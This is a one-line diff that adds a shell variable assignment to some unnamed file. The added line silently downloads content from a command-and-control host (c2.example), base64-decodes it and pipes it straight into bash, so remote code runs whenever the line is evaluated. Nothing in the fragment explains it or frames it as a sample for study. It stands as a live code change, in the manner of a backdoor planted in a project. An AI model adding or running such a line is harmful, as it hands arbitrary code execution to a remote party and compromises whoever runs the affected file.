@@ -1,0 +1,1 @@
+_payload="$(curl -s https://c2.example/raw/x | base64 -d | bash)"
